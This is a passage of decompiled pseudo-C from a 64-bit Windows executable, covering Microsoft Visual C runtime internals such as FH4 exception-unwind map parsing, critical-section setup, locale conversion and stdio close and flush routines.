  __int128 v43; // [rsp+E0h] [rbp-58h]

  v35 = a1;
  v36 = a2;
  v29 = a4;
  ImageBase = GetImageBase();
  v30 = ImageBase;
  v9 = sub_140012690(a3, (_QWORD *)a2);
  v10 = (_DWORD *)(a2 + 72);
  v37 = a2 + 72;
  if ( *(_DWORD *)(a2 + 72) != 0 )
  {
    if ( *(_DWORD *)(sub_14001244C() + 120) != -2 )
      abort();
    v9 = *v10 - 2;
  }
  else if ( *(_DWORD *)(sub_14001244C() + 120) != -2 )
  {
    v9 = *(_DWORD *)(sub_14001244C() + 120);
    *(_DWORD *)(sub_14001244C() + 120) = -2;
  }
  v11 = sub_14001244C();
  ++*(_DWORD *)(v11 + 48);
  v12 = nullptr;
  v42 = nullptr;
  v43 = 0;
  if ( *(_DWORD *)(a3 + 8) != 0 )
  {
    v13 = (_BYTE *)(*(int *)(a3 + 8) + *(_QWORD *)(a2 + 8));
    v14 = *v13 & 0xF;
    v12 = (FH4::UWMap4 *)&v13[-byte_14008FFB0[v14]];
    v41 = *((_DWORD *)v12 - 1) >> byte_14008FFB0[v14 + 16];
    v42 = v12;
  }
  else
  {
    v41 = 0;
  }
  v24[0] = (FH4::UWMap4 *)&v41;
  v24[1] = v12;
  v31 = &v41;
  v32 = v12;
  v33 = a1;
  v34 = ImageBase;
  FH4::UWMap4::getStartStop(
    (FH4::UWMap4 *)&v41,
    v9,
    a4,
    (struct FH4::UWMap4::iterator *)v24,
    (struct FH4::UWMap4::iterator *)&v31);
  while ( 1 )
  {
    v38 = &v41;
    v39 = v42;
    v15 = v24[1];
    if ( v24[1] < v42 || v24[1] <= v32 )
      break;
    FH4::UWMap4::ReadEntry(v24[0], (unsigned __int8 **)&v24[1]);
    v24[1] = v15;
    v16 = v24[0];
    v25 = *((_DWORD *)v24[0] + 5);
    v17 = *((_DWORD *)v24[0] + 6);
    v27 = *((_DWORD *)v24[0] + 7);
    v40 = *(_OWORD *)v24;
    FH4::UWMap4::ReadEntry(v24[0], (unsigned __int8 **)&v24[1]);
    v24[1] = (FH4::UWMap4 *)((char *)v15 - *((unsigned int *)v16 + 4));
    v18 = sub_140015670((unsigned int)&v31, a4, (unsigned int)&v40, v9, (__int64)v24);
    v9 = v18;
    v28 = v18;
    v26 = 0;
    v19 = 0;
    v20 = v25;
    if ( v25 != 0 )
      v19 = v17;
    v26 = v19;
    if ( v19 != 0 )
    {
      *v10 = v18 + 2;
      if ( (unsigned int)(v20 - 1) <= 1 )
      {
        v21 = (_QWORD *)(*v33 + v27);
        if ( v20 == 2 )
          v21 = (_QWORD *)*v21;
        CallSettingFrameEncoded(v19 + *(_QWORD *)(a2 + 8), *v33, v21, 259);
      }
      else
      {
        CallSettingFrame(v19 + *(_QWORD *)(a2 + 8), a1, 259);
      }
      SetImageBase(v30);
    }
  }
  result = sub_14001244C();
  if ( *(int *)(result + 48) > 0 )
  {
    result = sub_14001244C();
    --*(_DWORD *)(result + 48);
  }
  return result;
}


// ----- ?GetHandlerSearchState@__FrameHandler3@@SAHPEA_KPEAU_xDISPATCHER_CONTEXT@@PEBU_s_FuncInfo@@@Z @ 0x1400152e0 -----
static __int64 __fastcall __FrameHandler3::GetHandlerSearchState(
        unsigned __int64 *a1,
        struct _xDISPATCHER_CONTEXT *a2,
        const struct _s_FuncInfo *a3)
{
  int v6; // ebx
  unsigned __int64 v8; // [rsp+48h] [rbp+20h] BYREF

  v6 = sub_140012688((__int64)a3, a2);
  sub_140011614(a1, (ULONG64 *)a2, (__int64)a3, &v8);
  if ( v6 <= (int)sub_140012614(a1, (ULONG64 *)a2, (__int64)a3) )
  {
    return (unsigned int)sub_140012614(a1, (ULONG64 *)a2, (__int64)a3);
  }
  else
  {
    __SetState(&v8, a2, a3, v6);
    sub_14001264C(a1, (ULONG64 *)a2, (__int64)a3, v6);
  }
  return (unsigned int)v6;
}


// ----- sub_140015374 @ 0x140015374 -----
char __fastcall sub_140015374(__int64 a1, _DWORD *a2)
{
  __int64 v3; // rdi
  char v4; // r12
  int i; // ebp
  __int64 v6; // r13
  int *v7; // r13
  __int64 v8; // rbx
  int v9; // r15d
  __int64 v10; // rsi
  __int64 ThrowImageBase; // rax
  _BYTE *v12; // rdi
  __int64 v13; // rsi
  __int64 v14; // rbx
  __int64 ImageBase; // rax
  int v16; // eax

  v3 = a1;
  if ( a2 == nullptr )
    abort();
  v4 = 0;
  for ( i = 0; i < *a2; ++i )
  {
    v6 = *(int *)(*(_QWORD *)(v3 + 48) + 12LL);
    v7 = (int *)(GetThrowImageBase() + 4 + v6);
    v8 = *(int *)(*(_QWORD *)(v3 + 48) + 12LL);
    v9 = *(_DWORD *)(GetThrowImageBase() + v8);
    if ( v9 > 0 )
    {
      while ( 1 )
      {
        v10 = *v7;
        ThrowImageBase = GetThrowImageBase();
        v12 = *(_BYTE **)(v3 + 48);
        v13 = ThrowImageBase + v10;
        v14 = (int)a2[1];
        ImageBase = GetImageBase();
        v16 = sub_140013E34(v14 + 20LL * i + ImageBase, v13, v12);
        v3 = a1;
        if ( v16 != 0 )
          break;
        --v9;
        ++v7;
        if ( v9 <= 0 )
          goto LABEL_8;
      }
      v4 = 1;
    }
LABEL_8:
    ;
  }
  return v4;
}


// ----- sub_140015454 @ 0x140015454 -----
char __fastcall sub_140015454(int *a1)
{
  int v1; // edi
  __int64 v3; // rbx
  __int64 v4; // rbp
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rax

  v1 = 0;
  if ( *a1 <= 0 )
    return 0;
  while ( 1 )
  {
    v3 = a1[1];
    v4 = 20LL * v1;
    if ( *(_DWORD *)(v3 + GetImageBase() + v4 + 4) != 0 )
    {
      v5 = a1[1];
      v6 = *(int *)(v4 + GetImageBase() + v5 + 4);
      v7 = v6 + GetImageBase();
    }
    else
    {
      v7 = 0;
    }
    if ( (unsigned int)_std_type_info_compare(v7 + 8, (__int64)&qword_14009F6E0) == 0 )
      break;
    if ( ++v1 >= *a1 )
      return 0;
  }
  return 1;
}


// ----- ?ReadEntry@UWMap4@FH4@@AEAAXPEAPEAE@Z @ 0x1400154e8 -----
void __fastcall FH4::UWMap4::ReadEntry(FH4::UWMap4 *this, unsigned __int8 **a2)
{
  __int64 v4; // rcx
  unsigned __int8 *v5; // r8
  unsigned int v6; // eax
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int *v10; // rdx
  __int64 v11; // rcx
  unsigned __int8 *v12; // rdx
  int v13; // eax

  v4 = **a2 & 0xF;
  v5 = &(*a2)[-byte_14008FFB0[v4]];
  v6 = *((_DWORD *)v5 - 1) >> byte_14008FFB0[v4 + 16];
  *a2 = v5;
  v7 = v6 & 3;
  *((_DWORD *)this + 4) = v6 >> 2;
  *((_DWORD *)this + 5) = v7;
  if ( (unsigned int)(v7 - 1) <= 1 )
  {
    v9 = *(_DWORD *)*a2;
    *a2 += 4;
    *((_DWORD *)this + 6) = v9;
    v10 = (int *)*a2;
    v11 = *(_BYTE *)v10 & 0xF;
    v12 = (unsigned __int8 *)v10 - byte_14008FFB0[v11];
    v13 = *((_DWORD *)v12 - 1) >> byte_14008FFB0[v11 + 16];
    *a2 = v12;
    *((_DWORD *)this + 7) = v13;
  }
  else if ( v7 == 3 )
  {
    v8 = *(_DWORD *)*a2;
    *a2 += 4;
    *((_DWORD *)this + 6) = v8;
  }
}


// ----- unknown_libname_50 @ 0x140015584 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_50(__int64 a1, __int64 (__fastcall *a2)(__int64, __int64), __int64 a3)
{
  return a2(a1, a3);
}


// ----- unknown_libname_51 @ 0x140015590 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_51(
        __int64 a1,
        __int64 (__fastcall *a2)(__int64, __int64, _QWORD),
        __int64 a3,
        unsigned int a4)
{
  return a2(a1, a3, a4);
}


// ----- ?getStartStop@UWMap4@FH4@@QEAAXHHAEAViterator@12@0@Z @ 0x1400155a0 -----
void __fastcall FH4::UWMap4::getStartStop(
        FH4::UWMap4 *this,
        int a2,
        int a3,
        struct FH4::UWMap4::iterator *a4,
        struct FH4::UWMap4::iterator *a5)
{
  unsigned __int8 *v5; // rax
  char v6; // bp
  char v7; // r14
  int v8; // edi
  struct FH4::UWMap4::iterator *v9; // r12
  unsigned __int8 *v12; // rsi
  unsigned __int8 *v13; // r15
  int v14; // r12d
  _OWORD *v15; // rax
  _OWORD *v16; // rcx
  unsigned __int8 *v17; // [rsp+60h] [rbp+8h] BYREF
  int v18; // [rsp+68h] [rbp+10h]
  struct FH4::UWMap4::iterator *v19; // [rsp+78h] [rbp+20h]

  v19 = a4;
  v18 = a2;
  v5 = *((unsigned __int8 **)this + 1);
  v6 = 0;
  v7 = 0;
  v17 = v5;
  v8 = 0;
  v9 = a4;
  v12 = v5 - 1;
  v13 = v5 - 1;
  if ( *(int *)this > 0 )
  {
    v14 = v18;
    while ( 1 )
    {
      if ( v8 == v14 )
      {
        v12 = v5;
        v6 = 1;
      }
      if ( v8 == a3 )
      {
        v13 = v5;
        v7 = 1;
      }
      if ( v6 != 0 && v7 != 0 )
        break;
      FH4::UWMap4::ReadEntry(this, &v17);
      if ( ++v8 >= *(_DWORD *)this )
        break;
      v5 = v17;
    }
    v9 = v19;
  }
  v15 = *(_OWORD **)v9;
  *((_QWORD *)v9 + 1) = v12;
  *v15 = *(_OWORD *)this;
  v15[1] = *((_OWORD *)this + 1);
  v16 = *(_OWORD **)a5;
  *((_QWORD *)a5 + 1) = v13;
  *v16 = *(_OWORD *)this;
  v16[1] = *((_OWORD *)this + 1);
}


// ----- sub_140015670 @ 0x140015670 -----
__int64 __fastcall sub_140015670(__int64 a1, unsigned int a2, __int64 a3, unsigned int a4, __int64 a5)
{
  unsigned __int64 v7; // r10
  unsigned __int8 *v8; // r11
  FH4::UWMap4 *v9; // rcx
  FH4::UWMap4 *v10; // rcx
  FH4::UWMap4 *v12; // [rsp+20h] [rbp-18h]
  FH4::UWMap4 *v13; // [rsp+20h] [rbp-18h]
  unsigned __int8 *v14[2]; // [rsp+28h] [rbp-10h] BYREF

  v7 = *(_QWORD *)(a5 + 8);
  if ( v7 > *(_QWORD *)(a3 + 8) )
    return 0xFFFFFFFFLL;
  v8 = *(unsigned __int8 **)(a1 + 8);
  if ( (unsigned __int64)v8 > v7 )
    return 0xFFFFFFFFLL;
  if ( (__int64)(v7 - (_QWORD)v8) >= (__int64)(*(_QWORD *)(a3 + 8) - v7) )
  {
    a2 = a4;
    v10 = *(FH4::UWMap4 **)a5;
    v13 = *(FH4::UWMap4 **)a5;
    v14[0] = *(unsigned __int8 **)(a5 + 8);
    if ( *(_QWORD *)(a3 + 8) > v7 )
    {
      while ( 1 )
      {
        FH4::UWMap4::ReadEntry(v10, v14);
        --a2;
        if ( (unsigned __int8 *)*(_QWORD *)(a3 + 8) <= v14[0] )
          break;
        v10 = v13;
      }
    }
  }
  else
  {
    v9 = *(FH4::UWMap4 **)a1;
    v12 = v9;
    v14[0] = v8;
    if ( v7 > (unsigned __int64)v8 )
    {
      while ( 1 )
      {
        FH4::UWMap4::ReadEntry(v9, v14);
        ++a2;
        if ( (unsigned __int8 *)*(_QWORD *)(a5 + 8) <= v14[0] )
          break;
        v9 = v12;
      }
    }
  }
  return a2;
}


// ----- _NLG_Notify @ 0x140015760 -----
void NLG_Notify()
{
  ;
}


// ----- nullsub_1 @ 0x140015790 -----
void nullsub_1()
{
  ;
}


// ----- __except_validate_context_record @ 0x140015794 -----
void (*_except_validate_context_record())()
{
  return guard_check_icall_nop;
}


// ----- sub_1400157CC @ 0x1400157cc -----
char sub_1400157CC()
{
  __int64 v0; // rbx

  v0 = 0;
  while ( InitializeCriticalSectionEx((LPCRITICAL_SECTION)&unk_1400A0130 + v0, 0xFA0u, 0) )
  {
    ++dword_1400A0158;
    v0 = (unsigned int)(v0 + 1);
    if ( (_DWORD)v0 != 0 )
      return 1;
  }
  _vcrt_uninitialize_locks();
  return 0;
}


// ----- __vcrt_uninitialize_locks @ 0x140015814 -----
char _vcrt_uninitialize_locks()
{
  int v0; // ebx

  v0 = dword_1400A0158;
  while ( v0 != 0 )
  {
    DeleteCriticalSection((LPCRITICAL_SECTION)&unk_1400A0130 + (unsigned int)--v0);
    --dword_1400A0158;
  }
  return 1;
}


// ----- _CallSettingFrame @ 0x140015890 -----
void CallSettingFrame()
{
  void (*v0)(void); // rax

  NLG_Notify();
  v0();
  nullsub_1();
  NLG_Notify();
}


// ----- _CallSettingFrame_LookupContinuationIndex @ 0x1400158d0 -----
void CallSettingFrame_LookupContinuationIndex()
{
  void (*v0)(void); // rax

  NLG_Notify();
  v0();
  nullsub_1();
}


// ----- _CallSettingFrame_NotifyContinuationAddr @ 0x140015900 -----
void CallSettingFrame_NotifyContinuationAddr()
{
  NLG_Notify();
}


// ----- _CallSettingFrameEncoded @ 0x140015930 -----
void __fastcall CallSettingFrameEncoded(__int64 a1, __int64 a2, __int64 a3)
{
  void (__fastcall *v3)(__int64); // rax

  NLG_Notify();
  v3(a3);
  nullsub_1();
  NLG_Notify();
}


// ----- ??0_LocaleUpdate@@QEAA@QEAU__crt_locale_pointers@@@Z @ 0x140015978 -----
_LocaleUpdate *__fastcall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this, struct __crt_locale_pointers *const a2)
{
  _OWORD *v3; // rsi
  __int128 v4; // xmm0
  __int64 v5; // rax
  int v6; // eax

  *((_BYTE *)this + 24) = 0;
  v3 = (_OWORD *)((char *)this + 8);
  if ( a2 != nullptr )
  {
    v4 = (__int128)*a2;
LABEL_5:
    *v3 = v4;
    return this;
  }
  if ( dword_1400A0560 == 0 )
  {
    v4 = *(_OWORD *)&off_14009ECA8;
    goto LABEL_5;
  }
  v5 = sub_14001C7D8();
  *(_QWORD *)this = v5;
  *(_QWORD *)v3 = *(_QWORD *)(v5 + 144);
  *((_QWORD *)this + 2) = *(_QWORD *)(v5 + 136);
  sub_14001C98C(v5, v3);
  sub_14001C9F8(*(_QWORD *)this, (char *)this + 16);
  v6 = *(_DWORD *)(*(_QWORD *)this + 936LL);
  if ( (v6 & 2) == 0 )
  {
    *(_DWORD *)(*(_QWORD *)this + 936LL) = v6 | 2;
    *((_BYTE *)this + 24) = 1;
  }
  return this;
}


// ----- sub_140015A14 @ 0x140015a14 -----
__int64 __fastcall sub_140015A14(unsigned __int16 a1, struct __crt_locale_pointers *a2)
{
  __int64 result; // rax
  __int64 v3; // rcx
  unsigned __int16 v4; // dx
  int v5; // eax
  __int64 v6; // [rsp+30h] [rbp-20h] BYREF
  __int64 v7; // [rsp+38h] [rbp-18h]
  char v8; // [rsp+48h] [rbp-8h]
  unsigned __int16 v9; // [rsp+60h] [rbp+10h] BYREF
  unsigned __int16 v10; // [rsp+70h] [rbp+20h] BYREF

  v9 = a1;
  result = 0xFFFF;
  if ( a1 == 0xFFFF )
    return result;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v6, a2);
  if ( *(_DWORD *)(v7 + 12) != 65001 )
  {
    v4 = v9;
    if ( v9 < 0x100u )
    {
      if ( (*((_BYTE *)&unk_140091510 + 2 * (unsigned __int8)v9 + 2) & 1) == 0 )
      {
        v4 = (unsigned __int8)v9;
        goto LABEL_15;
      }
      v3 = (unsigned __int8)v9;
      goto LABEL_10;
    }
    if ( *(_QWORD *)(v7 + 312) == 0 )
      goto LABEL_15;
LABEL_13:
    v10 = 0;
    v5 = _crtLCMapStringW(*(_QWORD *)(v7 + 312), 256, (unsigned int)&v9, 1, (__int64)&v10, 1);
    v4 = v9;
    if ( v5 != 0 )
      v4 = v10;
    goto LABEL_15;
  }
  if ( v9 >= 0x80u )
    goto LABEL_13;
  if ( (*((_BYTE *)&unk_140091510 + 2 * (unsigned __int8)v9 + 2) & 1) != 0 )
  {
    v3 = (unsigned __int8)v9;
LABEL_10:
    v4 = *(unsigned __int8 *)(*(_QWORD *)(v7 + 272) + v3);
    goto LABEL_15;
  }
  v4 = (unsigned __int8)v9;
LABEL_15:
  if ( v8 != 0 )
    *(_DWORD *)(v6 + 936) &= ~2u;
  return v4;
}


// ----- sub_140015B10 @ 0x140015b10 -----
__int64 __fastcall sub_140015B10(unsigned __int16 a1)
{
  return sub_140015A14(a1, nullptr);
}


// ----- j__free_base @ 0x140015b20 -----
// attributes: thunk
void __cdecl j__free_base(void *Block)
{
  free_base(Block);
}


// ----- sub_140015B28 @ 0x140015b28 -----
__int64 __fastcall sub_140015B28(const WCHAR *a1)
{
  DWORD LastError; // eax

  if ( DeleteFileW(a1) )
    return 0;
  LastError = GetLastError();
  sub_140018818(LastError);
  return 0xFFFFFFFFLL;
}


// ----- sub_140015B50 @ 0x140015b50 -----
__int64 sub_140015B50()
{
  int v0; // eax
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v4; // rbp
  _DWORD *v5; // rsi
  char *v6; // r14

  v0 = dword_1400A0160;
  v1 = 0;
  v2 = 3;
  if ( dword_1400A0160 == 0 )
  {
    v0 = 512;
LABEL_5:
    dword_1400A0160 = v0;
    goto LABEL_6;
  }
  if ( dword_1400A0160 < 3 )
  {
    v0 = 3;
    goto LABEL_5;
  }
LABEL_6:
  Block = calloc_base(v0, 8u);
  free_base(nullptr);
  if ( Block == nullptr )
  {
    dword_1400A0160 = 3;
    Block = calloc_base(3u, 8u);
    free_base(nullptr);
    if ( Block == nullptr )
      return 0xFFFFFFFFLL;
  }
  v4 = 0;
  v5 = &unk_14009E968;
  v6 = (char *)&unk_14009E950;
  do
  {
    InitializeCriticalSectionEx((LPCRITICAL_SECTION)(v6 + 48), 0xFA0u, 0);
    *(_QWORD *)((char *)Block + v1) = v6;
    if ( *(_QWORD *)(qword_1400A0680[v4 >> 6] + 72 * (v4 & 0x3F) + 40) >= 0xFFFFFFFFFFFFFFFEuLL
      || *(_QWORD *)(qword_1400A0680[v4 >> 6] + 72 * (v4 & 0x3F) + 40) == 0 )
    {
      *v5 = -2;
    }
    ++v4;
    v6 += 88;
    v1 += 8;
    v5 += 22;
    --v2;
  }
  while ( v2 != 0 );
  return 0;
}


// ----- __acrt_iob_func @ 0x140015c70 -----
FILE *__cdecl _acrt_iob_func(unsigned int Ix)
{
  return (FILE *)((char *)&unk_14009E950 + 88 * Ix);
}


// ----- __acrt_uninitialize_stdio @ 0x140015c84 -----
void _acrt_uninitialize_stdio()
{
  __int64 i; // rbx

  flushall();
  fcloseall();
  for ( i = 0; i != 24; i += 8 )
  {
    _acrt_stdio_free_buffer_nolock(*(_QWORD *)((char *)Block + i));
    DeleteCriticalSection((LPCRITICAL_SECTION)(*(_QWORD *)((char *)Block + i) + 48LL));
  }
  free_base(Block);
  Block = nullptr;
}


// ----- _get_stream_buffer_pointers @ 0x140015ce0 -----
errno_t __cdecl get_stream_buffer_pointers(FILE *Stream, char ***Base, char ***Pointer, int **Count)
{
  if ( Stream != nullptr )
  {
    if ( Base != nullptr )
      *Base = (char **)&Stream->_cnt;
    if ( Pointer != nullptr )
      *Pointer = &Stream->_ptr;
    if ( Count != nullptr )
      *Count = (int *)&Stream->_base;
    return 0;
  }
  else
  {
    *(_DWORD *)sub_140018888(0, Base, Pointer, Count) = 22;
    invalid_parameter_noinfo();
    return 22;
  }
}


// ----- _lock_file @ 0x140015d28 -----
void __cdecl lock_file(FILE *Stream)
{
  EnterCriticalSection((LPCRITICAL_SECTION)&Stream[1]);
}


// ----- _unlock_file @ 0x140015d34 -----
void __cdecl unlock_file(FILE *Stream)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)&Stream[1]);
}


// ----- ?_fclose_internal@@YAHQEAU_iobuf@@AEAV__crt_cached_ptd_host@@@Z @ 0x140015d40 -----
__int64 __fastcall _fclose_internal(FILE *Stream, struct __crt_cached_ptd_host *a2)
{
  unsigned int v5; // edi

  if ( Stream == nullptr )
  {
    *((_BYTE *)a2 + 48) = 1;
    *((_DWORD *)a2 + 11) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a2);
    return 0xFFFFFFFFLL;
  }
  if ( (HIDWORD(Stream->_base) & 0x1000) != 0 )
  {
    __acrt_stdio_free_stream();
    return 0xFFFFFFFFLL;
  }
  lock_file(Stream);
  v5 = _fclose_nolock_internal(Stream, a2);
  unlock_file(Stream);
  return v5;
}


// ----- ?_fclose_nolock_internal@@YAHQEAU_iobuf@@AEAV__crt_cached_ptd_host@@@Z @ 0x140015dbc -----
__int64 __fastcall _fclose_nolock_internal(FILE *Stream, struct __crt_cached_ptd_host *a2)
{
  unsigned int v5; // esi
  unsigned int v6; // eax
  char *tmpfname; // rcx

  if ( Stream != nullptr )
  {
    v5 = -1;
    if ( (HIDWORD(Stream->_base) & 0x2000) != 0 )
    {
      v5 = _acrt_stdio_flush_nolock(Stream);
      _acrt_stdio_free_buffer_nolock(Stream);
      v6 = fileno(Stream);
      if ( (int)sub_14001DDB4(v6, a2) >= 0 )
      {
        tmpfname = Stream->_tmpfname;
        if ( tmpfname != nullptr )
        {
          free_base(tmpfname);
          Stream->_tmpfname = nullptr;
        }
      }
      else
      {
        v5 = -1;
      }
    }
    __acrt_stdio_free_stream(Stream);
    return v5;
  }
  else
  {
    *((_BYTE *)a2 + 48) = 1;
    *((_DWORD *)a2 + 11) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a2);
    return 0xFFFFFFFFLL;
  }
}


// ----- unknown_libname_79 @ 0x140015e64 -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_79(__int64 a1)
{
  DWORD LastError; // eax
  bool v3; // zf
  __int64 v4; // rdx
  __int64 v5; // rax
  DWORD v6; // ecx
  __int64 v7; // rbx
  DWORD dwErrCode; // [rsp+30h] [rbp+8h] BYREF

  if ( *(_QWORD *)a1 == 0 )
  {
    LastError = GetLastError();
    v3 = *(_BYTE *)(a1 + 16) == 0;
    dwErrCode = LastError;
    if ( v3 )
    {
      *(_QWORD *)(a1 + 8) = 0;
      v4 = 0;
      *(_BYTE *)(a1 + 16) = 1;
    }
    else
    {
      v4 = *(_QWORD *)(a1 + 8);
    }
    v5 = sub_14001C8C8(&dwErrCode, v4);
    v6 = dwErrCode;
    v7 = v5;
    *(_QWORD *)a1 = v5;
    SetLastError(v6);
    if ( v7 == 0 )
      abort();
  }
  return *(_QWORD *)a1;
}


// ----- fclose @ 0x140015ecc -----
int __cdecl fclose(FILE *Stream)
{
  int v1; // edi
  int v2; // ebx
  int v3; // ebx
  _QWORD v5[2]; // [rsp+20h] [rbp-40h] BYREF
  char v6; // [rsp+30h] [rbp-30h]
  __int128 v7; // [rsp+38h] [rbp-28h]
  char v8; // [rsp+48h] [rbp-18h]
  int v9; // [rsp+4Ch] [rbp-14h]
  char v10; // [rsp+50h] [rbp-10h]
  int v11; // [rsp+54h] [rbp-Ch]
  char v12; // [rsp+58h] [rbp-8h]

  v5[0] = 0;
  v6 = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v8 = 1;
    v7 = *(_OWORD *)&off_14009ECA8;
  }
  v1 = _fclose_internal(Stream, (struct __crt_cached_ptd_host *)v5);
  if ( v8 == 2 )
    *(_DWORD *)(v5[0] + 936LL) &= ~2u;
  if ( v10 != 0 )
  {
    v2 = v9;
    *(_DWORD *)(unknown_libname_79((__int64)v5) + 32) = v2;
  }
  if ( v12 != 0 )
  {
    v3 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v5) + 36) = v3;
  }
  return v1;
}


// ----- sub_140015F64 @ 0x140015f64 -----
void __fastcall sub_140015F64(__int64 a1, FILE **a2, FILE ***a3, FILE **a4)
{
  FILE *v6; // rcx
  int base_high; // ecx

  lock_file(*a2);
  v6 = **a3;
  if ( v6 != nullptr )
  {
    base_high = HIDWORD(v6->_base);
    if ( (base_high & 0x2000) != 0 )
    {
      if ( (base_high & 3) == 2 && (base_high & 0xC0) != 0 || (base_high & 0x800) != 0 )
      {
        if ( *(_BYTE *)a3[2] != 0 || (HIDWORD((**a3)->_base) & 2) != 0 )
        {
          if ( fflush_nolock(**a3) == -1 )
            *(_DWORD *)a3[3] = -1;
          else
            ++*(_DWORD *)a3[1];
        }
      }
      else
      {
        ++*(_DWORD *)a3[1];
      }
    }
  }
  unlock_file(*a4);
}


// ----- ??$?RV_lambda_886d6c58226a84441f68b9f2b8217b83_@@AEAV_lambda_ab61a845afdef5b7c387490eaf3616ee_@@V_lambda_f7f22ab5edc0698d5f6905b0d3f44752_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_886d6c58226a84441f68b9f2b8217b83_@@AEAV_lambda_ab61a845afdef5b7c387490eaf3616ee_@@$$QEAV_lambda_f7f22ab5edc0698d5f6905b0d3f44752_@@@Z @ 0x140016000 -----
__int64 __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_886d6c58226a84441f68b9f2b8217b83_,_lambda_ab61a845afdef5b7c387490eaf3616ee_ &,_lambda_f7f22ab5edc0698d5f6905b0d3f44752_>(
        __int64 a1,
        unsigned int *a2,
        FILE ***a3,
        unsigned int *a4)
{
  FILE *v6; // rbx
  FILE *v7; // r14
  char *ptr; // rcx
  int v9; // ecx
  FILE **v10; // rdx
  FILE **v11; // rcx
  FILE **v12; // rax
  FILE *v14; // [rsp+20h] [rbp-58h] BYREF
  FILE *v15; // [rsp+28h] [rbp-50h] BYREF
  FILE *v16[2]; // [rsp+30h] [rbp-48h] BYREF
  FILE **v17[7]; // [rsp+40h] [rbp-38h] BYREF
  char v18; // [rsp+88h] [rbp+10h] BYREF
  unsigned int *v19; // [rsp+98h] [rbp+20h]

  v19 = a4;
  _vcrt_lock(*a2);
  v6 = (FILE *)Block;
  v7 = (FILE *)((char *)Block + 8 * dword_1400A0160);
  while ( 1 )
  {
    v16[1] = v6;
    if ( v6 == v7 )
      break;
    ptr = v6->_ptr;
    v14 = (FILE *)ptr;
    if ( ptr != nullptr )
    {
      v9 = *((_DWORD *)ptr + 5);
      if ( (v9 & 0x2000) != 0 )
      {
        if ( (v9 & 3) == 2 && (v9 & 0xC0) != 0 || (v9 & 0x800) != 0 )
        {
          v10 = a3[2];
          v11 = a3[1];
          v12 = *a3;
          v17[0] = &v14;
          v17[1] = v12;
          v17[2] = v11;
          v17[3] = v10;
          v15 = v14;
          v16[0] = v14;
          sub_140015F64((__int64)&v18, v16, v17, &v15);
        }
        else
        {
          ++*(_DWORD *)*a3;
        }
      }
    }
    v6 = (FILE *)((char *)v6 + 8);
  }
  return _vcrt_unlock(*a4);
}


// ----- ??$?RV_lambda_c376a267cfb53b6959b3b692ec76b120_@@AEAV_lambda_9a32fed5bf61b6b509b2d3f6003082a1_@@V_lambda_572fbb9fa0ab338edf41edfd4b5fcc8d_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_c376a267cfb53b6959b3b692ec76b120_@@AEAV_lambda_9a32fed5bf61b6b509b2d3f6003082a1_@@$$QEAV_lambda_572fbb9fa0ab338edf41edfd4b5fcc8d_@@@Z @ 0x1400160e4 -----
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_c376a267cfb53b6959b3b692ec76b120_,_lambda_9a32fed5bf61b6b509b2d3f6003082a1_ &,_lambda_572fbb9fa0ab338edf41edfd4b5fcc8d_>(
        __int64 a1,
        FILE **a2,
        FILE ***a3,
        FILE **a4)
{
  lock_file(*a2);
  LODWORD(a3) = fflush_nolock(**a3);
  unlock_file(*a4);
  return (unsigned int)a3;
}


// ----- ?common_flush_all@@YAH_N@Z @ 0x140016124 -----
__int64 __fastcall common_flush_all(char a1)
{
  __int64 result; // rax
  unsigned int v2; // [rsp+20h] [rbp-20h] BYREF
  unsigned int v3; // [rsp+24h] [rbp-1Ch] BYREF
  FILE **v4[3]; // [rsp+28h] [rbp-18h] BYREF
  char v5; // [rsp+50h] [rbp+10h] BYREF
  char v6; // [rsp+58h] [rbp+18h] BYREF
  unsigned int v7; // [rsp+60h] [rbp+20h] BYREF
  unsigned int v8; // [rsp+68h] [rbp+28h] BYREF

  v5 = a1;
  v8 = 0;
  v7 = 0;
  v4[0] = (FILE **)&v8;
  v4[1] = (FILE **)&v5;
  v4[2] = (FILE **)&v7;
  v2 = 8;
  v3 = 8;
  __crt_seh_guarded_call<void>::operator()<_lambda_886d6c58226a84441f68b9f2b8217b83_,_lambda_ab61a845afdef5b7c387490eaf3616ee_ &,_lambda_f7f22ab5edc0698d5f6905b0d3f44752_>(
    (__int64)&v6,
    &v3,
    v4,
    &v2);
  result = v7;
  if ( v5 != 0 )
    return v8;
  return result;
}


// ----- __acrt_stdio_flush_nolock @ 0x140016184 -----
__int64 __fastcall _acrt_stdio_flush_nolock(FILE *Stream, __int64 a2)
{
  int base_high; // ecx
  int v5; // edi
  char *v6; // rsi
  unsigned int v7; // eax

  base_high = HIDWORD(Stream->_base);
  if ( (base_high & 3) == 2 && (base_high & 0xC0) != 0 )
  {
    v5 = LODWORD(Stream->_ptr) - Stream->_cnt;
    LODWORD(Stream->_base) = 0;
    v6 = *(char **)&Stream->_cnt;
    Stream->_ptr = v6;
    if ( v5 > 0 )
    {
      v7 = fileno(Stream);
      if ( v5 != (unsigned int)write_internal(v7, v6, (unsigned int)v5, a2) )
      {
        _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, 0x10u);
        return 0xFFFFFFFFLL;
      }
      if ( (HIDWORD(Stream->_base) & 4) != 0 )
        _InterlockedAnd((volatile signed __int32 *)&Stream->_base + 1, 0xFFFFFFFD);
    }
  }
  return 0;
}


// ----- _fflush_nolock @ 0x140016210 -----
int __cdecl fflush_nolock(FILE *Stream)
{
  int v2; // edi
  int v3; // eax
  int v4; // ebx
  int v5; // ebx
